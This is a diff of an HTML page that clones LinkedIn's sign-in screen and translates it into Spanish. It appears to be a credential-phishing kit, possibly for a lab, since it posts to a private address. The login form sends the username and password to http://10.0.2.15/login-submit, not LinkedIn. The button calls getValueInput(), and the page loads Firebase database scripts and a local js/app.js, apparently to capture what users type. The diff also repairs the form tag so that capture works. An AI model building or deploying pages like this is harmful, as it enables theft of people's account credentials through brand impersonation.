@@ -7,7 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="asset-url" id="artdeco/static/images/icons.svg"
         content="https://static-exp1.licdn.com/sc/h/14b9qognflsnmq5d3h7urb01a">
-    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <title>Iniciar sesión en LinkedIn | LinkedIn</title>
     <link rel="shortcut icon" href="https://static-exp1.licdn.com/sc/h/3m4lyvbs6efg8pyhv7kupo6dh">
     <link rel="apple-touch-icon" href="https://static-exp1.licdn.com/sc/h/bgsy6v435pgzegckur5tz0u2m">
     <link rel="apple-touch-icon-precomposed" href="https://static-exp1.licdn.com/sc/h/dhra8axxv5afjd3u90gduwpcj">
@@ -97,28 +97,26 @@
                             fill="#0A66C2" />
                     </svg></li-icon>
             </a>
-            <!--Contenedor datos del usuario-->
-            <div id="data_user" class="card-layout" onload="inicializar()">
+            <div id="" class="card-layout">
                 <div id="organic-div" class="">
                     <div class="header__content ">
-                        <h1 class="header__content__heading ">Sign in</h1>
-                        <p class="header__content__subheading ">Stay updated on your professional world</p>
+                        <h1 class="header__content__heading ">Iniciar sesión</h1>
+                        <p class="header__content__subheading ">Mantente al día de tu mundo profesional</p>
                     </div>
-                    <! method="post" class="login__form" action="http://10.0.2.15/login-submit" novalidate><input
+                    <form method="post" class="login__form" action="http://10.0.2.15/login-submit" novalidate><input
                             type="hidden" name="csrfToken" value="ajax:1506196122173703151" /><code
                             id="login_form_validation_error_username"
-                            style="display: none;"><!--"Please enter a valid username"--></code><code
+                            style="display: none;"><!--"Introduce un nombre de usuario válido"--></code><code
                             id="consumer_login__text_plain__large_username"
-                            style="display: none;"><!--"Email or phone number must be between 3 to 128 characters"--></code><code
+                            style="display: none;"><!--"La contraseña debe tener 6 caracteres como mínimo."--></code><code
                             id="consumer_login__text_plain__no_username"
-                            style="display: none;"><!--"Please enter an email address or phone number"--></code>
-                        <!--Nombre de Usuario-->
+                            style="display: none;"><!--"Introduce un correo electrónico o un número de teléfono"--></code>
                         <div class="form__input--floating mt-24">
+                            <!--Nombre de usuario-->
                             <input id="username" name="session_key" type="text"
                                 aria-describedby="error-for-username" required validation="email|tel" class="" autofocus
-                                aria-label="Email or Phone" />
-                                <label class="form__label--floating" for="username"
-                                aria-hidden="true">Email or Phone</label>
+                                aria-label="Email or Phone" /><label class="form__label--floating" for="username"
+                                aria-hidden="true">Email o teléfono</label>
                             <div error-for="username" id="error-for-username" class="form__label--error  hidden"
                                 role="alert" aria-live="assertive"></div>
                         </div><code id="domainSuggestion" style="display: none;"><!--false--></code><input type="hidden"
@@ -133,42 +131,41 @@
                             value="default" id="fp_data_login" /><input type="hidden" name="apfc" value="{}"
                             id="apfc-login" /><input type="hidden" name="_d" value="d" /><input type="hidden"
                             name="showGoogleOneTapLogin" value="true" /><code id="i18nShow"
-                            style="display: none;"><!--"show"--></code><code id="i18nHide"
-                            style="display: none;"><!--"hide"--></code><input type="hidden" name="controlId"
+                            style="display: none;"><!--"mostrar"--></code><code id="i18nHide"
+                            style="display: none;"><!--"ocultar"--></code><input type="hidden" name="controlId"
                             value="d_checkpoint_lg_consumerLogin-login_submit_button" /><code
                             id="consumer_login__text_plain__empty_password"
                             style="display: none;"><!--"Please enter a password."--></code><code
                             id="consumer_login__text_plain__small_password"
-                            style="display: none;"><!--"The password you provided must have at least 6 characters."--></code><code
+                            style="display: none;"><!--"La contraseña debe tener 6 caracteres como mínimo."--></code><code
                             id="consumer_login__text_plain__large_password"
                             style="display: none;"><!--"The password you provided must have at most 400 characters."--></code><code
                             id="consumer_login__text_plain__wrong_password"
                             style="display: none;"><!--"Hmm, that&#39;s not the right password. Please try again "--></code><code
                             id="consumer_login__text_plain__large_password_200_chars"
                             style="display: none;"><!--"The password you provided must have at most 200 characters."--></code>
-                        <!--Contraseña-->
                         <div class="form__input--floating mt-24">
+                            <!--Contraseña-->
                             <input id="password" type="password"
                                 aria-describedby="error-for-password" name="session_password" required
-                                validation="password" class="" aria-label="Password" />
-                                <label for="password"
-                                class="form__label--floating" aria-hidden="true">Password
-                                </label>
-                                <span
+                                validation="password" class="" aria-label="Password" /><label for="password"
+                                class="form__label--floating" aria-hidden="true">Contraseña</label><span
                                 id="password-visibility-toggle" class="button__password-visibility" role="button"
-                                tabindex="0">show</span>
+                                tabindex="0">mostrar</span>
                             <div error-for="password" id="error-for-password" class="form__label--error   hidden"
                                 role="alert" aria-live="assertive"></div>
                         </div><a
                             href="https://www.linkedin.com/checkpoint/rp/request-password-reset?trk=guest_homepage-basic_nav-header-signin"
                             class="btn__tertiary--medium forgot-password"
-                            data-cie-control-urn="forgot-password-btn">Forgot password?</a><input type="hidden"
+                            data-cie-control-urn="forgot-password-btn">¿Has olvidado tu contraseña?</a><input type="hidden"
                             name="loginFlow" id="loginFlow" value="REMEMBER_ME_OPTIN" />
-                        <!-- Botón de Inicio de sesión-->
-                        <div class="login__form_action_container">
-                            <button id="btnLogin" onclick="getValueInput()"
+
+                        <div class="login__form_action_container ">
+                            <!--Botón de login-->
+                            <button
+                                id="btnLogin" onclick="getValueInput()"
                                 class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit"
-                                type="submit" aria-label="Sign in">Sign in</button></div>
+                                type="submit" aria-label="Sign in">Iniciar sesión</button></div>
                     </form>
                     <div class="alternate-signin-container">
                         <div id="or-separator" class="or-separator mt-12 hidden"><span class="or-text">or</span></div>
@@ -195,10 +192,10 @@
                     </div>
                 </div>
             </div>
-            <div class="join-now">New to LinkedIn? <a
+            <div class="join-now">¿Eres nuevo en LinkedIn? <a
                     href="https://www.linkedin.com/signup/cold-join?source=guest_homepage-basic_nav-header-signin"
                     class="btn__tertiary--medium" id="join_now" data-litms-control-urn="login_join_now"
-                    data-cie-control-urn="join-now-btn">Join now</a></div>
+                    data-cie-control-urn="join-now-btn">Únete ahora</a></div>
             <div id="checkpointGoogleOneTapContainerId" class="googleOneTapContainer global-alert-offset"></div>
         </main>
         <footer class="footer__base" role="contentinfo">
@@ -461,19 +458,20 @@
     <script src="https://static-exp1.licdn.com/sc/h/djykitbj8q6nbc5kqowcmv2h7" defer></script><code
         id="lix_cv_scoring_login_get_fingerprint" style="display: none;"><!--"control"--></code>
     <script src='https://static-exp1.licdn.com/sc/h/byqtlviivgrjzt006a5gb1mi6' defer></script>
-
+   
+   
     <!-- The core Firebase JS SDK is always required and must be listed first -->
-<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
 
-<!-- TODO: Add SDKs for Firebase products that you want to use
-     https://firebase.google.com/docs/web/setup#available-libraries -->
-<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-analytics.js"></script>
-
-<script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-firestore.js"></script>
-
-<script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-database.js"></script>
-
-<script src="js/app.js"></script>
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+         https://firebase.google.com/docs/web/setup#available-libraries -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-analytics.js"></script>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-firestore.js"></script>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-database.js"></script>
+    
+    <script src="js/app.js"></script>
 
 </body>
 
